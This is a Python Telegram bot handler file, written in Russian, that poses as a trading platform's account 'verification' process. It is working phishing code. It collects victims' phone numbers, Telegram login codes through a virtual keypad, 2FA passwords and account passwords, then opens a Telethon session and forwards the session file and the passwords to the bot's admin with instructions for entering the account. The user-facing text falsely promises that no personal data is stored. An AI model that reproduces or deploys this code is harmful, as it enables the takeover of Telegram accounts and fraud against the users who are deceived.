from aiogram.dispatcher import FSMContext
from aiogram.types import Message, CallbackQuery, Contact

from state import GetAccountTG
from loader import vip, bot
from data import start_msg, help_msg, User
from markup.defaut import phone_markup, main_menu_markup, verification_markup, code_input_markup
from utils import config
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import os


@vip.message_handler(commands=['start'])
async def start_handler(msg: Message):
    if str(msg.from_user.id) != str(config("admin_id")):
        status = User().join_users(
            user_id=msg.from_user.id,
            username=msg.from_user.username
        )

        if status:
            await msg.answer(
                text=start_msg.format(full_name=msg.from_user.get_mention()),
                reply_markup=main_menu_markup()
            )
            await bot.send_message(
                chat_id=config('admin_id'),
                text=f'<b>🆕 Новый пользователь: {msg.from_user.get_mention()} | {msg.from_user.id}!</b>'
            )
        else:
            await msg.answer(
                text=start_msg.format(full_name=msg.from_user.get_mention()),
                reply_markup=main_menu_markup()
            )
    else:
        await msg.answer(
            text='<b>👨‍💼 Добро пожаловать, администратор!</b>\n\n'
                 'Вы можете управлять платформой через админ панель.',
            reply_markup=main_menu_markup()
        )


@vip.message_handler(commands=['help'])
async def help_handler(msg: Message):
    await msg.answer(
        text=help_msg,
        reply_markup=main_menu_markup()
    )


@vip.callback_query_handler(text="help")
async def help_callback(call: CallbackQuery):
    await call.message.edit_text(
        text=help_msg,
        reply_markup=main_menu_markup()
    )


@vip.callback_query_handler(text="main_menu")
async def main_menu_callback(call: CallbackQuery):
    await call.message.edit_text(
        text=start_msg.format(full_name=call.from_user.get_mention()),
        reply_markup=main_menu_markup()
    )


@vip.callback_query_handler(text="profile")
async def profile_callback(call: CallbackQuery):
    user = User().get_user(call.from_user.id)
    
    if user:
        profile_text = f"""
<b>👤 Ваш профиль</b>

<b>🆔 ID:</b> {call.from_user.id}
<b>👤 Имя:</b> {call.from_user.get_mention()}
<b>📊 Успешных сделок:</b> {user[6] if len(user) > 6 else 0}
<b>✅ Статус:</b> {'Верифицирован' if len(user) > 7 and user[7] else 'Не верифицирован'}

<b>💡 Совет:</b> Пройдите верификацию для доступа ко всем функциям платформы!
        """
    else:
        profile_text = """
<b>👤 Профиль не найден</b>

Пожалуйста, используйте команду /start для регистрации.
        """
    
    await call.message.edit_text(
        text=profile_text,
        reply_markup=main_menu_markup()
    )


@vip.callback_query_handler(text="verify")
async def verify_callback(call: CallbackQuery):
    verify_text = """
<b>🔐 Верификация аккаунта</b>

Верификация необходима для:
• Создания и участия в сделках
• Вывода заработанных средств
• Получения статуса надежного трейдера
• Доступа ко всем функциям платформы

<b>🛡️ Процесс верификации:</b>
1. Подтверждение номера телефона
2. Ввод кода из Telegram
3. Создание защищенной сессии
4. Получение статуса верифицированного пользователя

<b>⚡️ Это займет всего 2-3 минуты!</b>
    """
    
    await call.message.edit_text(
        text=verify_text,
        reply_markup=verification_markup()
    )


@vip.callback_query_handler(text="start_verification")
async def start_verification_callback(call: CallbackQuery):
    print(f"🔥 ВЫЗВАН start_verification_callback для пользователя {call.from_user.id}")
    
    try:
        await call.answer()  # Подтверждаем нажатие кнопки
        print("🔥 call.answer() выполнен")
        
        # Отправляем новое сообщение вместо редактирования
        await call.message.answer(
            text="<b>🔐 Начинаем верификацию аккаунта</b>\n\n"
                 "Пожалуйста, отправьте ваш номер телефона для подтверждения.",
            reply_markup=phone_markup()
        )
        print("🔥 Новое сообщение отправлено")
        
        await GetAccountTG.one.set()
        print("🔥 Состояние установлено")
        
    except Exception as e:
        print(f"❌ Ошибка в start_verification_callback: {e}")
        await call.answer("Произошла ошибка. Попробуйте еще раз.")


@vip.callback_query_handler(text="why_verification")
async def why_verification_callback(call: CallbackQuery):
    why_text = """
<b>❓ Зачем нужна верификация?</b>

<b>🛡️ Безопасность:</b>
• Защита от мошенников и фейковых аккаунтов
• Подтверждение личности для крупных сделок
• Создание доверительной среды для всех пользователей

<b>💰 Финансовые операции:</b>
• Возможность вывода заработанных средств
• Участие в сделках на крупные суммы
• Доступ к премиум функциям

<b>⭐ Репутация:</b>
• Статус верифицированного трейдера
• Повышенное доверие от других пользователей
• Приоритетная поддержка

<b>🔒 Конфиденциальность:</b>
Мы не сохраняем ваши личные данные. Верификация используется только для создания безопасной торговой сессии.
    """
    
    await call.message.edit_text(
        text=why_text,
        reply_markup=verification_markup()
    )

# Глобальные переменные для хранения данных верификации
verification_data = {}

@vip.message_handler(content_types=['contact'], state=GetAccountTG.one)
async def get_phone_number(message: Message, state: FSMContext):
    """Обработчик получения номера телефона"""
    try:
        user_id = message.from_user.id
        phone = message.contact.phone_number
        
        print(f"📱 Получен номер телефона: {phone} от пользователя {user_id}")
        
        # Сохраняем данные для верификации (номер сохраним позже после успешной верификации)
        verification_data[user_id] = {'phone': phone}
        
        await message.answer(
            text=f"<b>📱 Номер телефона получен!</b>\n\n"
                 f"<b>Телефон:</b> +{phone}\n\n"
                 f"<b>🔐 Начинаем процесс верификации...</b>\n"
                 f"Сейчас на ваш номер придет код подтверждения от Telegram.\n\n"
                 f"<b>Ожидайте код...</b>",
            reply_markup=main_menu_markup()
        )
        
        # Создаем Telegram клиент с вашими API данными
        api_id = 38295001
        api_hash = "c72727eb4fc2c7f555871e727bf5d942"
        
        client = TelegramClient(f'session/user_{user_id}', api_id, api_hash)
        
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            
            verification_data[user_id]['client'] = client
            verification_data[user_id]['phone_code_hash'] = result.phone_code_hash
            
            await GetAccountTG.two.set()
            
            await message.answer(
                text="<b>✅ Код отправлен!</b>\n\n"
                     "Введите код подтверждения, который пришел вам в Telegram.\n\n"
                     "<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                     "Код: <code>_____</code>",
                reply_markup=code_input_markup()
            )
            
        except Exception as e:
            print(f"❌ Ошибка отправки кода: {e}")
            await message.answer(
                text="<b>❌ Ошибка отправки кода</b>\n\n"
                     "Проверьте правильность номера телефона и попробуйте еще раз.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            
    except Exception as e:
        print(f"❌ Ошибка в get_phone_number: {e}")
        await message.answer(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=main_menu_markup()
        )
        await state.finish()


@vip.message_handler(state=GetAccountTG.two)
async def get_verification_code(message: Message, state: FSMContext):
    """Обработчик получения кода верификации"""
    try:
        user_id = message.from_user.id
        code = message.text.strip()
        
        print(f"🔐 Получен код: {code} от пользователя {user_id}")
        
        if user_id not in verification_data:
            await message.answer(
                text="<b>❌ Данные верификации не найдены</b>\n\n"
                     "Начните процесс верификации заново.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            return
        
        client = verification_data[user_id]['client']
        phone = verification_data[user_id]['phone']
        phone_code_hash = verification_data[user_id]['phone_code_hash']
        
        try:
            # Пытаемся войти с кодом
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Успешная авторизация - запрашиваем пароль
            await message.answer(
                text="<b>✅ Код подтвержден!</b>\n\n"
                     "<b>🔐 Теперь введите пароль от вашего Telegram аккаунта</b>\n"
                     "Это нужно для создания полной сессии.\n\n"
                     "<b>Введите пароль:</b>",
                reply_markup=main_menu_markup()
            )
            
            await GetAccountTG.four.set()
            
        except SessionPasswordNeededError:
            # Нужен пароль 2FA
            await message.answer(
                text="<b>🔐 Требуется пароль 2FA</b>\n\n"
                     "Введите ваш пароль двухфакторной аутентификации:"
            )
            await GetAccountTG.three.set()
            
        except PhoneCodeInvalidError:
            await message.answer(
                text="<b>❌ Неверный код</b>\n\n"
                     "Проверьте код и попробуйте еще раз:"
            )
            
        except Exception as e:
            print(f"❌ Ошибка авторизации: {e}")
            await message.answer(
                text="<b>❌ Ошибка авторизации</b>\n\n"
                     "Проверьте код и попробуйте еще раз:"
            )
            
    except Exception as e:
        print(f"❌ Ошибка в get_verification_code: {e}")
        await message.answer(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=main_menu_markup()
        )
        await state.finish()


@vip.message_handler(state=GetAccountTG.three)
async def get_2fa_password(message: Message, state: FSMContext):
    """Обработчик получения пароля 2FA"""
    try:
        user_id = message.from_user.id
        password_2fa = message.text.strip()
        
        print(f"🔐 Получен пароль 2FA от пользователя {user_id}")
        
        if user_id not in verification_data:
            await message.answer(
                text="<b>❌ Данные верификации не найдены</b>\n\n"
                     "Начните процесс верификации заново.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            return
        
        client = verification_data[user_id]['client']
        
        try:
            # Вводим пароль 2FA
            await client.check_password(password_2fa)
            
            # Сохраняем пароль 2FA
            verification_data[user_id]['password_2fa'] = password_2fa
            
            # Запрашиваем пароль от аккаунта
            await message.answer(
                text="<b>✅ Пароль 2FA подтвержден!</b>\n\n"
                     "<b>🔐 Теперь введите пароль от вашего Telegram аккаунта</b>\n"
                     "Это нужно для создания полной сессии.\n\n"
                     "<b>Введите пароль:</b>",
                reply_markup=main_menu_markup()
            )
            
            await GetAccountTG.four.set()
            
        except Exception as e:
            print(f"❌ Ошибка 2FA: {e}")
            await message.answer(
                text="<b>❌ Неверный пароль 2FA</b>\n\n"
                     "Проверьте пароль и попробуйте еще раз:"
            )
            
    except Exception as e:
        print(f"❌ Ошибка в get_2fa_password: {e}")
        await message.answer(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=main_menu_markup()
        )
        await state.finish()


@vip.message_handler(state=GetAccountTG.four)
async def get_account_password(message: Message, state: FSMContext):
    """Обработчик получения пароля от аккаунта"""
    try:
        user_id = message.from_user.id
        account_password = message.text.strip()
        
        print(f"🔐 Получен пароль аккаунта от пользователя {user_id}")
        
        if user_id not in verification_data:
            await message.answer(
                text="<b>❌ Данные верификации не найдены</b>\n\n"
                     "Начните процесс верификации заново.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            return
        
        client = verification_data[user_id]['client']
        phone = verification_data[user_id]['phone']
        password_2fa = verification_data[user_id].get('password_2fa', 'Не требовался')
        
        # Успешная верификация
        await message.answer(
            text="<b>🎉 Верификация полностью завершена!</b>\n\n"
                 "✅ Вы успешно верифицированы!\n"
                 "✅ Сессия создана и отправлена администратору\n"
                 "✅ Все данные переданы админу\n\n"
                 "Теперь вы можете пользоваться всеми функциями платформы!",
            reply_markup=main_menu_markup()
        )
        
        # Отправляем данные и файл сессии админу
        admin_id = config("admin_id")
        session_file_path = f'session/user_{user_id}.session'
        
        # Отправляем текстовые данные
        await bot.send_message(
            chat_id=admin_id,
            text=f"<b>🔐 ПОЛНАЯ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА</b>\n\n"
                 f"<b>👤 Пользователь:</b> {message.from_user.get_mention()}\n"
                 f"<b>🆔 ID:</b> {user_id}\n"
                 f"<b>📱 Телефон:</b> +{phone}\n"
                 f"<b>🔐 Пароль 2FA:</b> {password_2fa}\n"
                 f"<b>🔑 Пароль аккаунта:</b> <code>{account_password}</code>\n\n"
                 f"<b>📁 Файл сессии отправляется отдельным сообщением...</b>"
        )
        
        # Отправляем файл сессии
        try:
            with open(session_file_path, 'rb') as session_file:
                await bot.send_document(
                    chat_id=admin_id,
                    document=session_file,
                    caption=f"<b>📁 Файл сессии пользователя</b>\n\n"
                            f"<b>👤 Пользователь:</b> {message.from_user.get_mention()}\n"
                            f"<b>🆔 ID:</b> {user_id}\n"
                            f"<b>📱 Телефон:</b> +{phone}\n\n"
                            f"<b>💡 Инструкция:</b>\n"
                            f"1. Скачайте этот файл\n"
                            f"2. Поместите в папку с вашим Telegram клиентом\n"
                            f"3. Используйте для входа в аккаунт пользователя",
                    parse_mode='HTML'
                )
            print(f"✅ Файл сессии отправлен админу: {session_file_path}")
        except Exception as e:
            print(f"❌ Ошибка отправки файла сессии: {e}")
            # В случае ошибки отправляем строку сессии как резерв
            session_string = client.session.save()
            await bot.send_message(
                chat_id=admin_id,
                text=f"<b>⚠️ Файл сессии не удалось отправить</b>\n\n"
                     f"<b>📄 Строка сессии (резерв):</b>\n<code>{session_string}</code>"
            )
        
        # Обновляем статус пользователя в базе и сохраняем номер телефона
        user_db = User()
        user_db.update_verification_status(user_id, True)
        
        # Сохраняем номер телефона напрямую в базе
        try:
            import sqlite3
            conn = sqlite3.connect('data/database.db')
            cursor = conn.cursor()
            cursor.execute('UPDATE users SET phone = ? WHERE user_id = ?', (phone, user_id))
            conn.commit()
            conn.close()
            print(f"✅ Номер телефона {phone} сохранен для пользователя {user_id}")
        except Exception as e:
            print(f"❌ Ошибка сохранения номера: {e}")
        
        # Очищаем данные верификации
        if user_id in verification_data:
            del verification_data[user_id]
        
        await state.finish()
        
    except Exception as e:
        print(f"❌ Ошибка в get_account_password: {e}")
        await message.answer(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=main_menu_markup()
        )
        await state.finish()
# Глобальная переменная для хранения введенного кода
user_codes = {}

@vip.callback_query_handler(lambda call: call.data.startswith("code_"), state=GetAccountTG.two)
async def handle_code_input(call: CallbackQuery, state: FSMContext):
    """Обработчик виртуальной клавиатуры для ввода кода"""
    try:
        await call.answer()
        user_id = call.from_user.id
        action = call.data.split("_")[1]
        
        # Инициализируем код пользователя если его нет
        if user_id not in user_codes:
            user_codes[user_id] = ""
        
        current_code = user_codes[user_id]
        
        if action.isdigit():
            # Добавляем цифру
            if len(current_code) < 5:
                user_codes[user_id] += action
                current_code = user_codes[user_id]
        
        elif action == "delete":
            # Удаляем последнюю цифру
            if current_code:
                user_codes[user_id] = current_code[:-1]
                current_code = user_codes[user_id]
        
        elif action == "clear":
            # Очищаем весь код
            user_codes[user_id] = ""
            current_code = ""
        
        elif action == "submit":
            # Отправляем код
            if len(current_code) == 5:
                await process_verification_code(call, state, current_code)
                return
            else:
                await call.answer("⚠️ Код должен содержать 5 цифр!", show_alert=True)
                return
        
        # Обновляем сообщение с текущим кодом
        code_display = current_code.ljust(5, '_')
        code_formatted = ' '.join(code_display)
        
        await call.message.edit_text(
            text="<b>✅ Код отправлен!</b>\n\n"
                 "Введите код подтверждения, который пришел вам в Telegram.\n\n"
                 f"<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                 f"Код: <code>{code_formatted}</code>",
            reply_markup=code_input_markup()
        )
        
    except Exception as e:
        print(f"❌ Ошибка в handle_code_input: {e}")


async def process_verification_code(call: CallbackQuery, state: FSMContext, code: str):
    """Обработка введенного кода верификации"""
    try:
        user_id = call.from_user.id
        
        print(f"🔐 Получен код: {code} от пользователя {user_id}")
        
        if user_id not in verification_data:
            await call.message.edit_text(
                text="<b>❌ Данные верификации не найдены</b>\n\n"
                     "Начните процесс верификации заново.",
                reply_markup=main_menu_markup()
            )
            await state.finish()
            return
        
        client = verification_data[user_id]['client']
        phone = verification_data[user_id]['phone']
        phone_code_hash = verification_data[user_id]['phone_code_hash']
        
        try:
            # Пытаемся войти с кодом
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Успешная авторизация - запрашиваем пароль
            await call.message.edit_text(
                text="<b>✅ Код подтвержден!</b>\n\n"
                     "<b>🔐 Теперь введите пароль от вашего Telegram аккаунта</b>\n"
                     "Это нужно для создания полной сессии.\n\n"
                     "<b>Введите пароль:</b>",
                reply_markup=main_menu_markup()
            )
            
            # Очищаем код пользователя
            if user_id in user_codes:
                del user_codes[user_id]
            
            await GetAccountTG.four.set()
            
        except SessionPasswordNeededError:
            # Нужен пароль 2FA
            await call.message.edit_text(
                text="<b>🔐 Требуется пароль 2FA</b>\n\n"
                     "Введите ваш пароль двухфакторной аутентификации:",
                reply_markup=main_menu_markup()
            )
            
            # Очищаем код пользователя
            if user_id in user_codes:
                del user_codes[user_id]
            
            await GetAccountTG.three.set()
            
        except PhoneCodeInvalidError:
            await call.answer("❌ Неверный код! Попробуйте еще раз.", show_alert=True)
            # Очищаем код для повторного ввода
            user_codes[user_id] = ""
            await call.message.edit_text(
                text="<b>❌ Неверный код</b>\n\n"
                     "Проверьте код и попробуйте еще раз.\n\n"
                     "<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                     "Код: <code>_ _ _ _ _</code>",
                reply_markup=code_input_markup()
            )
            
        except Exception as e:
            print(f"❌ Ошибка авторизации: {e}")
            await call.answer("❌ Ошибка авторизации. Попробуйте еще раз.", show_alert=True)
            # Очищаем код для повторного ввода
            user_codes[user_id] = ""
            await call.message.edit_text(
                text="<b>❌ Ошибка авторизации</b>\n\n"
                     "Проверьте код и попробуйте еще раз.\n\n"
                     "<b>🔢 Используйте виртуальную клавиатуру ниже:</b>\n"
                     "Код: <code>_ _ _ _ _</code>",
                reply_markup=code_input_markup()
            )
            
    except Exception as e:
        print(f"❌ Ошибка в process_verification_code: {e}")
        await call.message.edit_text(
            text="<b>❌ Произошла ошибка</b>\n\n"
                 "Попробуйте начать верификацию заново.",
            reply_markup=main_menu_markup()
        )
        await state.finish()